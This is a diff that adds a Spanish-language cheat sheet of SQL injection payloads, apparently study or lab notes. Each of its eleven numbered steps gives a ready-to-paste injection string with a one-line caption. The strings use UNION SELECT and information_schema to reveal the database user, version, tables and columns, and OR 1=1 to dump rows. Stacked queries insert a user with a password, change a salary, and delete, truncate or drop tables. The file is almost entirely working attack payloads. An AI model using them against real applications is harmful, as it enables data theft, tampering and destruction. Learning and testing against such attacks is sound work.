@@ -1,0 +1,34 @@
+Comandos para SQL INJECTION:
+
+1) Saber el nombre de usuario de la BD
+	' UNION SELECT 1,2,user() -- 
+	NOTA: cuando se hace un UNION el número de columnas debe de coincidir con ambas tablas
+2) Saber la version de la BD y el nombre de la BD
+	-mariaflores' UNION SELECT 1,@@version,database() -- 
+
+3) Saber el numero de columnas (si tira error es porque no se ha acertado al numero de cols)
+	' ORDER BY 3 -- 
+4) Saber el nombre de las tablas de la BD
+	-diego99' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- 
+5) Saber el nombre de las columnas de la BD
+	-diego99' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=database() -- 
+
+
+6) Saber 1 tupla de la tabla
+	' OR 1=1 LIMIT 1 -- 
+7) Saber todas las tuplas de la tabla
+	' OR 1=1 -- 
+
+8) Insertar datos a una tabla
+	'; INSERT INTO usuarios (id,user,password) VALUES (NULL,'camila','camila123'); -- 
+
+9) Actualizar datos de una tabla	
+	'; UPDATE salarios SET monto=15000 WHERE id=4; -- 
+
+10) Eliminar datos individuales, trucar o blanquear tabla y eliminar tabla:
+	'; DELETE FROM prueba WHERE id=4; -- 
+	'; TRUNCATE TABLE prueba; -- 
+	'; DROP TABLE prueba; -- 
+
+11) Crear Tabla
+	'; CREATE TABLE MyGuests (id INT(6) AUTO_INCREMENT PRIMARY KEY, firstname VARCHAR(30) NOT NULL, lastname VARCHAR(30) NOT NULL, email VARCHAR(50)); -- 
